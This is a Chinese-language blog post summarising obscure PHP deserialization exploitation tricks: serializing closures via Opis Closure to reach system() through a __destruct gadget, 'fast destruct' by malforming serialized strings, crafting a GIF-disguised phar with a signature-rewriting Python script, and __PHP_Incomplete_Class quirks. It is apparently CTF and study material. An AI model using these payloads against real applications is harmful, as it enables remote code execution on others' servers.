# PHP反序列化冷知识点总结

  
  
&lt;!--more--&gt;  
## Opi/Closure(闭包)函数  
`PHP`在5.3版本引入了`Closure`类用于代表匿名函数  
根据`PHP`官方文档，Closure 类定义如下  
```php  
&lt;?  
class Closure {  
    /* 方法 */  
    private __construct()  
    public static bind(Closure $closure, ?object $newThis, object|string|null $newScope = &#34;static&#34;): ?Closure  
    public bindTo(object $newthis, mixed $newscope = &#39;static&#39;): Closure  
    public call(object $newThis, mixed ...$args): mixed  
    public static fromCallable(callable $callback): Closure  
}  
?&gt;  
```  
但是`Closure`是不允许序列化和反序列化的，然而[Opi Closure](https://github.com/opis/closure)库实现了这一功能，通过`Opi Closure`，可以方便对闭包进行序列化和反序列化，只需要使用`Opis\Closure\serialize()`和`Opis\Closure\unserialize()`即可  
举个例子  
```php  
&lt;?php  
include(&#34;./vendor/opis/closure/autoload.php&#34;);  
class Test{  
    public $source;  
    public function __destruct(){  
        call_user_func($this-&gt;source,1);  
    }  
}  
$func = function(){  
    $cmd = &#39;whoami&#39;;  
    system($cmd);  
};  
$raw = \Opis\Closure\serialize($func);  
$t = new Test;  
$t-&gt;source = \Opis\Closure\unserialize($raw);  
$exp = serialize($t);  
unserialize($exp);  
  
//output f10wers13eicheng  
```  
## fast destruct  
- 在 PHP 中单独执行`unserialize`函数，则反序列化得到的生命周期仅限于这个函数执行的生命周期，在执行完`unserialize()`函数时就会执行`__destruct`方法  
- 而如果将`unserialize()`函数执行后得到的字符串赋值给一个变量，则反序列化的对象的生命周期就会变长，会一直到对象被销毁时才执行析构方法  
比如PHP中有如下代码  
```php  
&lt;?php  
class test{  
    public function __destruct(){  
        echo &#34;bypass&#34;;  
    }  
}  
$a = @unserialize(&#39;O:4:&#34;test&#34;:0:{}&#39;);  
throw new Exception(&#34;No No No&#34;);  
?&gt;  
  
//output  
-&gt; % php index.php   
PHP Fatal error:  Uncaught Exception: No No No in /Users/f10wers13eicheng/Desktop/webserver/index.php:8  
Stack trace:  
#0 {main}  
  thrown in /Users/f10wers13eicheng/Desktop/webserver/index.php on line 8  
  
Fatal error: Uncaught Exception: No No No in /Users/f10wers13eicheng/Desktop/webserver/index.php:8  
Stack trace:  
#0 {main}  
  thrown in /Users/f10wers13eicheng/Desktop/webserver/index.php on line 8  
```  
### 0x01  
但是如果我们破坏正常序列化的结构，就会提前执行`__destruct`  
```php  
//O:4:&#34;test&#34;:0:{  
//O:4:&#34;test&#34;:0:{1}  
//bypass  
```  
### 0x02  
利用`array`，众所周知`array`也是能被序列化/反序列化的，当反序列化时遇到`null`也会触发`fast destruct`，修改序列化后`array`的属性值即可  
```php  
&lt;?php  
error_reporting(0);  
class test01{  
    public function __destruct(){  
        echo &#34;test01&#34;.PHP_EOL;  
    }  
}  
//$o = serialize(array(new test01));  
//echo $o;  
$a = unserialize(&#39;a:2:{i:0;O:6:&#34;test01&#34;:0:{}i:1;i:0;}&#39;);  
throw new Exception(&#34;No No No&#34;);  
?&gt;  
```  
  
## phar反序列化  
生成phar文件  
```php  
$clazz = new Clazz();  
@unlink(&#34;test.phar&#34;);  
$p = new Phar(&#34;test.phar&#34;,0);  
$p-&gt;startBuffering();  
$p-&gt;setMetadata($clazz);  
$p-&gt;setStub(&#34;GIF89a__HALT_COMPILER();&#34;);  
$p-&gt;addFromString(&#34;text.txt&#34;,&#34;successful!&#34;);  
$p-&gt;stopBuffering();  
```  
重新计算 phar 文件的签名  
```python  
import hashlib  
  
f = open(&#34;test.phar&#34;, &#34;rb&#34;)  
data = f.read()  
f.close()  
length = int(data[47:51][::-1].hex(), 16)  
data = data[:51 &#43; length - 1] &#43; b&#34;1&#34; &#43; data[51 &#43; length:len(data) - 28]  
data &#43;= hashlib.sha1(data).digest()  
data &#43;= b&#34;\x02\x00\x00\x00GBMB&#34;  
f = open(&#34;test.phar&#34;, &#34;wb&#34;)  
f.write(data)  
f.close()  
```  
  
## stdClass和__PHP_Incomplete_Class  
`stdClass`是所有类的基类，可以代替`array`来反序列化两个类  
```php  
&lt;?php  
var_dump(unserialize(&#39;O:8:&#34;stdClass&#34;:2:{i:0;O:6:&#34;test01&#34;:0:{}i:1;O:6:&#34;test02&#34;:0:{}}&#39;))  
?&gt;  
  
//output  
object(stdClass)#1 (2) {  
  [&#34;0&#34;]=&gt;  
  object(__PHP_Incomplete_Class)#2 (1) {  
    [&#34;__PHP_Incomplete_Class_Name&#34;]=&gt;  
    string(6) &#34;test01&#34;  
  }  
  [&#34;1&#34;]=&gt;  
  object(__PHP_Incomplete_Class)#3 (1) {  
    [&#34;__PHP_Incomplete_Class_Name&#34;]=&gt;  
    string(6) &#34;test02&#34;  
  }  
}  
```  
 当反序列化一个没有类会出现`__PHP_Incomplete_Class`，并且其中会出现`__PHP_Incomplete_Class_Name`属性，值就是反序列化时没有的那个类，在序列化的时候便会恢复回去。  
如果我们将`__PHP_Incomplete_Class_Name`属性改成其他名字，便会在反序列化再序列化之后就会消失  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402152157526.png)
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/  

